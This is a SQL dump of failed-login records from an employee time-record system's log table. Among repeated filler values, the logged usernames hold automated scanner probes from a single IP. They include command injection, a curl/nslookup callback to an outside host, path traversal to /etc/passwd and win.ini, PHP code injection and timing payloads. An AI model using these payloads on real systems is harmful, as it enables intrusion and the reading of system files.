INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1308', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: \"+response.write(9350072*9767213)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1309', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1310', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1311', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1312', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1313', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1314', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1315', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1316', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1317', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1318', '', '2023-05-08 03:50:17', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hiton\'.\'edxehgzd8801c.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(110).chr(70).chr(114).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1319', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1320', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1321', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1322', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1323', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hitpz\".\"kancswqdef01e.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(110).chr(90).chr(97).chr(8', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1324', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1325', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1326', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1327', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1328', '', '2023-05-08 03:50:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1329', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1330', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1331', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1332', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1333', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1334', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1335', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1336', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1337', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1338', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1339', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1340', '', '2023-05-08 03:50:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1341', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1342', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1343', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1344', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1345', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1346', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1347', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1348', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1349', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1350', '', '2023-05-08 03:50:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1351', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1352', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1353', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1354', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1355', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1356', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1357', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1358', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1359', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1360', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(108).concat(80).concat(108).concat(90)+(require\"socket\"\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1361', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1362', '', '2023-05-08 03:50:21', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1363', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1364', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(117).concat(82).concat(121).concat(89)+(require\'socket\'\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1365', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1366', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1367', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1368', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1369', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1370', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1371', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1372', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1373', '', '2023-05-08 03:50:22', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1374', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1375', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1376', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1377', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1378', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1379', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1380', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1381', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1382', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1383', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1384', '', '2023-05-08 03:50:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1385', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1386', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1387', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1388', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1389', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1390', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1391', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1392', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1393', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1394', '', '2023-05-08 03:50:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1395', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1396', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1397', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1398', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1399', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1400', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1401', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1402', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1403', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1404', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1405', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1406', '', '2023-05-08 03:50:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1407', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1408', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1409', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1410', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1411', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1412', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1413', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1414', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1415', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: echo sumgfz$()\\ knkhcd\\nz^xyu||a #\' &echo sumgfz$()\\ knkhcd\\nz^xyu||a #|\" &echo sumgfz$()\\ knkhcd\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1416', '', '2023-05-08 03:50:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1417', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1418', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1419', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1420', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: &echo xpsmgb$()\\ rodqla\\nz^xyu||a #\' &echo xpsmgb$()\\ rodqla\\nz^xyu||a #|\" &echo xpsmgb$()\\ rodqla\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1421', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1422', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1423', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*nbllzl&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1424', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: |echo kkvrkz$()\\ ufiwmg\\nz^xyu||a #\' |echo kkvrkz$()\\ ufiwmg\\nz^xyu||a #|\" |echo kkvrkz$()\\ ufiwmg\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1425', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1426', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1427', '', '2023-05-08 03:50:27', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*hziwqv&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1428', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitydhzyjkybkf552a.bxss.me||curl hitydhzyjkybkf552a.bxss.me))', '107.178.112.106');
